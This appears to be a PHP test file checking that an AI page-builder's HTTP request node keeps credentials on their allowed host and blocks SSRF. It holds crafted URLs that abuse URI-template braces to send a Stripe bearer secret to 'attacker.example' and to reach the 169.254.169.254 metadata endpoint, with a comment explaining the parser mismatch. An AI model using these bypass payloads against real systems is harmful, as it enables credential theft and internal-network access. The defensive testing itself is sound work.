<?php

declare(strict_types=1);

use Andre\AiPageBuilder\Flow\FlowContext;
use Andre\AiPageBuilder\Flow\Nodes\HttpRequestNode;
use Andre\AiPageBuilder\Models\Credential;
use Illuminate\Support\Facades\Http;

function smuggleNode(array $answers): HttpRequestNode
{
    return new class($answers) extends HttpRequestNode
    {
        public function __construct(private readonly array $answers) {}

        protected function resolveHost(string $host): array
        {
            return $this->answers[$host] ?? [];
        }
    };
}

it('sends a credential only to its allowed host, even with URI-template braces in the URL', function (): void {
    Http::fake(['*' => Http::response(['ok' => true], 200)]);
    Credential::query()->create([
        'name' => 'Stripe', 'key' => 'stripe', 'type' => 'bearer', 'secret' => 'sk_live_EXFIL_42',
        'allowed_hosts' => ['api.stripe.com'],
    ]);

    $ctx = new FlowContext;
    smuggleNode(['api.stripe.com' => ['93.184.216.34'], 'attacker.example' => ['93.184.216.35']])->run(['type' => 'http_request', 'config' => [
        'method' => 'get',
        // parse_url sees host api.stripe.com; Laravel's Http client expands the
        // RFC 6570 template {...} to '' and dials attacker.example.
        'url' => 'https://attacker.example{x@api.stripe.com/y}/collect',
        'credential' => 'stripe', 'output' => 'res',
    ], 'next' => []], $ctx);

    $sent = collect(Http::recorded())->map(fn ($pair) => [
        'host' => $pair[0]->toPsrRequest()->getUri()->getHost(),
        'auth' => $pair[0]->header('Authorization'),
    ])->all();

    foreach ($sent as $req) {
        expect($req['host'])->toBe('api.stripe.com', 'credential went to '.$req['host'].' with '.json_encode($req['auth']));
    }
    // A URL with template braces is refused outright: nothing is sent at all.
    expect($sent)->toBeEmpty();
});

it('does not let URI-template braces carry a request past the SSRF guard to an internal host', function (): void {
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $ctx = new FlowContext;
    smuggleNode(['public.example' => ['93.184.216.34']])->run(['type' => 'http_request', 'config' => [
        'method' => 'get',
        'url' => 'http://169.254.169.254{x@public.example/y}/latest/meta-data/',
        'output' => 'res',
    ], 'next' => []], $ctx);

    $hosts = collect(Http::recorded())->map(fn ($pair) => $pair[0]->toPsrRequest()->getUri()->getHost())->all();
    expect($hosts)->not->toContain('169.254.169.254');
});
